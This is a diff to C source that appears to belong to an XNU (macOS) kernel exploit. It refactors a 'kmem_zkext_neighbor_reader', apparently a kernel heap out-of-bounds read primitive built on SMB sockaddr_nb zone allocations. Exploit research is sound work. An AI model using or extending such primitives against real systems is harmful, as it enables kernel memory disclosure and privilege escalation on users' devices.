@@ -40,7 +40,6 @@ struct kmem_zkext_neighbor_reader {
     xnu_saddr_allocator_t pad_start_allocator;
     xnu_saddr_allocator_t reader_allocator;
     xnu_saddr_allocator_t pad_end_allocator;
-    kmem_neighbor_reader_t kmem_neighbor_reader;
     
     enum {
         STATE_CREATED,
@@ -63,7 +62,6 @@ kmem_zkext_neighour_reader_t kmem_zkext_neighbor_reader_create(const struct sock
     kmem_zkext_neighour_reader_t reader = malloc(sizeof(struct kmem_zkext_neighbor_reader));
     bzero(reader, sizeof(struct kmem_zkext_neighbor_reader));
     
-    reader->kmem_neighbor_reader = kmem_neighbor_reader_create(smb_addr);
     reader->smb_addr = *smb_addr;
     kmem_neighbor_reader_init_saddr_allocators(reader);
     
@@ -84,12 +82,11 @@ double kmem_zkext_neighbor_reader_check(kmem_zkext_neighour_reader_t reader, uin
         dispatch_semaphore_t sem = dispatch_semaphore_create(0);
         
         dispatch_async(xe_dispatch_queue(), ^() {
-            kmem_neighbor_reader_read(reader->kmem_neighbor_reader, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), 64, zone_size, to_read, buffer, 2048);
+            kmem_neighbor_reader_read(&reader->smb_addr, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), 64, zone_size, to_read, buffer, 2048);
             dispatch_semaphore_signal(sem);
         });
         
         if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 3 * 1000000000ULL))) {
-            reader->kmem_neighbor_reader = kmem_neighbor_reader_create(&reader->smb_addr);
             xe_log_warn("kmem neighbor read timed out");
             continue;
         }
@@ -144,7 +141,7 @@ int kmem_zkext_neighbor_reader_read(kmem_zkext_neighour_reader_t reader, uint8_t
         uint8_t snb_name = zone_size + zone_size - offsetof(struct sockaddr_nb, snb_name) + 2;
         int bytes_to_skip = zone_size - offsetof(struct sockaddr_nb, snb_name);
         
-        kmem_neighbor_reader_read(reader->kmem_neighbor_reader, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), zone_size * 2, zone_size, snb_name, buffer, 2048);
+        kmem_neighbor_reader_read(&reader->smb_addr, sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), sizeof(struct sockaddr_nb), zone_size * 2, zone_size, snb_name, buffer, 2048);
         
         uint32_t total_bytes_read = *((uint32_t*)buffer);
         xe_assert_cond(total_bytes_read, >=, snb_name);
@@ -178,7 +175,6 @@ void kmem_zkext_neighbor_reader_destroy(kmem_zkext_neighour_reader_t* reader_p) 
     xnu_saddr_allocator_destroy(&reader->pad_start_allocator);
     xnu_saddr_allocator_destroy(&reader->reader_allocator);
     xnu_saddr_allocator_destroy(&reader->pad_end_allocator);
-    kmem_neighbor_reader_destroy(&reader->kmem_neighbor_reader);
     free(reader);
     *reader_p = NULL;
 }
